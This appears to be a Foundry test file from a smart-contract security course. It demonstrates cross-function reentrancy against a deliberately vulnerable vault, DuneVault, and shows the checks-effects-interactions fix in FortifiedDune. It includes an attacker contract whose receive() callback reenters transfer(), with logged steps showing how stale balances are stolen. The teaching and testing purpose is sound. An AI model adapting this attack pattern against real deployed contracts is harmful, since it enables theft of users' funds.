// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../../../src/vulnerabilities/reentrancy/cross-function/DuneVault.sol";
import "../../../../src/vulnerabilities/reentrancy/cross-function/RippleAttacker.sol";
import "../../../../src/vulnerabilities/reentrancy/cross-function/solution/FortifiedDune.sol";

contract ReentrancyCrossFunctionTest is Test {

    DuneVault public duneVault;
    FortifiedDune public fortifiedDune;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy vulnerable and fixed contracts
        duneVault = new DuneVault();
        fortifiedDune = new FortifiedDune();

        // Fund victim and attacker with ETH
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);

        // Victim deposits into both vaults
        vm.prank(victim);
        duneVault.deposit{value: 5 ether}();

        vm.prank(victim);
        fortifiedDune.deposit{value: 5 ether}();

        console.log("=== SETUP ===");
        console.log("Victim deposited 5 ETH into DuneVault");
        console.log("Victim deposited 5 ETH into FortifiedDune");
    }

    // ================================================================
    // VULNERABLE: Cross-function attack succeeds on DuneVault
    // The attacker deposits 1 ETH, calls withdraw, and during the
    // callback reenters through transfer() — a DIFFERENT function —
    // to move the stale balance to their EOA before withdraw zeroes it
    // ================================================================
    function test_CrossFunctionAttackSucceeds_DuneVault() public {
        console.log("");
        console.log("=== CROSS-FUNCTION ATTACK: DuneVault ===");
        console.log("Step 1: Attacker deploys RippleAttacker");

        // Deploy attacker contract — owner is set to attacker EOA
        vm.prank(attacker);
        RippleAttacker rippleAttacker = new RippleAttacker(address(duneVault));

        console.log("Step 2: Record balances before the attack");
        console.log("  DuneVault ETH:           ", address(duneVault).balance);
        console.log("  Attacker EOA ETH:        ", attacker.balance);
        console.log("  Attacker vault balance:   0 (hasn't deposited yet)");

        // Attacker launches the attack with 1 ETH
        // Flow: deposit 1 ETH -> withdraw(1 ETH) -> receive() -> transfer(owner, 1 ETH)
        console.log("Step 3: Attacker calls attack() with 1 ETH");
        console.log("  -> RippleAttacker deposits 1 ETH into DuneVault");
        console.log("  -> RippleAttacker calls withdraw(1 ETH)");
        console.log("  -> DuneVault sends 1 ETH BEFORE updating balance (vulnerable!)");
        console.log("  -> receive() fires: balance is still 1 ETH (stale state)");
        console.log("  -> Reenters through transfer(), not withdraw() (cross-function!)");
        console.log("  -> Moves stale 1 ETH balance to attacker EOA in vault's books");
        console.log("  -> withdraw() finishes: sets RippleAttacker balance to 0 (too late)");

        vm.prank(attacker);
        rippleAttacker.attack{value: 1 ether}();

        console.log("Step 4: Check the damage");
        console.log("  RippleAttacker holds:     ", address(rippleAttacker).balance, " ETH (from withdraw)");
        console.log("  Attacker vault balance:   ", duneVault.balances(attacker), " (from stale transfer)");
        console.log("  DuneVault ETH:            ", address(duneVault).balance);

        // Attacker pulls ETH from the attacker contract
        vm.prank(attacker);
        rippleAttacker.withdraw();

        // Attacker withdraws the transferred balance from DuneVault
        vm.prank(attacker);
        duneVault.withdraw(1 ether);

        console.log("Step 5: Attacker cashes out both paths");
        console.log("  Attacker EOA ETH:        ", attacker.balance);
        console.log("  DuneVault ETH:           ", address(duneVault).balance);

        // Attacker started with 1 ETH and should now have 2 ETH
        // 1 ETH from withdraw + 1 ETH from the stale transfer
        assertEq(
            attacker.balance,
            2 ether,
            "Attack failed: attacker should have doubled their ETH"
        );

        // Vault should have lost 1 ETH of the victim's funds
        assertEq(
            address(duneVault).balance,
            4 ether,
            "Vault should have 4 ETH (victim's 5 minus 1 stolen)"
        );

        console.log("");
        console.log("ATTACK SUCCEEDED: Attacker turned 1 ETH into 2 ETH");
        console.log("  The key: withdraw() sends ETH before updating state");
        console.log("  The twist: attacker reenters through transfer(), not withdraw()");
        console.log("  Victim's 5 ETH balance is intact on paper, but vault only has 4 ETH");
    }

    // ================================================================
    // FIXED: Cross-function attack fails on FortifiedDune
    // CEI updates balance BEFORE the external call, so when the
    // attacker tries to reenter through transfer(), balance is already 0
    // ================================================================
    function test_CrossFunctionAttackFails_FortifiedDune() public {
        console.log("");
        console.log("=== CROSS-FUNCTION ATTACK ATTEMPT: FortifiedDune ===");

        // Deploy attacker targeting the fixed vault
        vm.prank(attacker);
        FortifiedDuneAttacker fortifiedAttacker = new FortifiedDuneAttacker(
            address(fortifiedDune)
        );

        console.log("Step 1: FortifiedDune balance before: ", address(fortifiedDune).balance);
        console.log("        Attacker EOA balance before:   ", attacker.balance);
        console.log("Step 2: Attacker deposits 1 ETH and tries the same attack");
        console.log("  -> withdraw() uses CEI: balance is zeroed BEFORE sending ETH");
        console.log("  -> receive() fires: checks balance -- already 0!");
        console.log("  -> The if-guard fails, transfer() is never called");
        console.log("  -> Attacker just gets their own 1 ETH back, no profit");

        // Attack doesn't revert -- CEI makes the balance check fail silently
        // The attacker deposits 1 ETH and withdraws 1 ETH, gaining nothing
        vm.prank(attacker);
        fortifiedAttacker.attack{value: 1 ether}();

        // Attacker pulls their ETH back from the contract
        vm.prank(attacker);
        fortifiedAttacker.withdraw();

        console.log("Step 3: FortifiedDune balance after:   ", address(fortifiedDune).balance);
        console.log("        Attacker EOA balance after:    ", attacker.balance);
        console.log("        Attacker vault balance:        ", fortifiedDune.balances(attacker));

        // Vault should still have all of victim's funds
        assertEq(
            address(fortifiedDune).balance,
            5 ether,
            "Vault should still have all 5 ETH"
        );

        // Attacker should have exactly what they started with -- no profit
        assertEq(
            attacker.balance,
            1 ether,
            "Attacker should only have their original 1 ETH back"
        );

        // Attacker should have zero vault balance -- no stale transfer happened
        assertEq(
            fortifiedDune.balances(attacker),
            0,
            "Attacker should have no vault balance"
        );

        console.log("");
        console.log("ATTACK NEUTRALIZED: CEI pattern killed the cross-function reentrancy");
        console.log("  Balance was zeroed before the external call");
        console.log("  receive() saw 0 balance -- transfer() was never called");
        console.log("  Attacker got back only what they deposited, zero profit");
        console.log("  nonReentrant adds a second lock as defense in depth");
    }

    // ================================================================
    // NORMAL USAGE: Deposits, transfers, and withdrawals work correctly
    // ================================================================
    function test_NormalWithdraw_DuneVault() public {
        console.log("");
        console.log("=== NORMAL WITHDRAW TEST: DuneVault ===");
        console.log("  Victim balance before withdraw: ", victim.balance);

        vm.prank(victim);
        duneVault.withdraw(1 ether);

        console.log("  Victim balance after withdraw:  ", victim.balance);

        assertEq(victim.balance, 1 ether, "Normal withdraw failed");
        console.log("  NORMAL WITHDRAW SUCCEEDED");
    }

    function test_NormalWithdraw_FortifiedDune() public {
        console.log("");
        console.log("=== NORMAL WITHDRAW TEST: FortifiedDune ===");
        console.log("  Victim balance before withdraw: ", victim.balance);

        vm.prank(victim);
        fortifiedDune.withdraw(1 ether);

        console.log("  Victim balance after withdraw:  ", victim.balance);

        assertEq(victim.balance, 1 ether, "Normal withdraw failed on FortifiedDune");
        console.log("  NORMAL WITHDRAW SUCCEEDED");
    }

    function test_NormalTransfer_DuneVault() public {
        console.log("");
        console.log("=== NORMAL TRANSFER TEST: DuneVault ===");
        address recipient = makeAddr("recipient");

        console.log("  Victim vault balance before: ", duneVault.balances(victim));
        console.log("  Recipient vault balance before: ", duneVault.balances(recipient));

        vm.prank(victim);
        duneVault.transfer(recipient, 2 ether);

        console.log("  Victim vault balance after:  ", duneVault.balances(victim));
        console.log("  Recipient vault balance after:  ", duneVault.balances(recipient));

        assertEq(duneVault.balances(victim), 3 ether, "Victim balance wrong after transfer");
        assertEq(duneVault.balances(recipient), 2 ether, "Recipient balance wrong after transfer");
        console.log("  NORMAL TRANSFER SUCCEEDED");
    }
}

// Helper attacker contract for testing FortifiedDune
// Mirrors RippleAttacker but targets the fixed contract
contract FortifiedDuneAttacker {
    FortifiedDune public fortifiedDune;
    address public owner;

    constructor(address _fortifiedDune) {
        fortifiedDune = FortifiedDune(_fortifiedDune);
        owner = msg.sender;
    }

    receive() external payable {
        // Try the cross-function reentry through transfer()
        // On FortifiedDune this fails — CEI already zeroed the balance
        if (fortifiedDune.balances(address(this)) > 0) {
            fortifiedDune.transfer(owner, fortifiedDune.balances(address(this)));
        }
    }

    function attack() public payable {
        fortifiedDune.deposit{value: msg.value}();
        fortifiedDune.withdraw(msg.value);
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
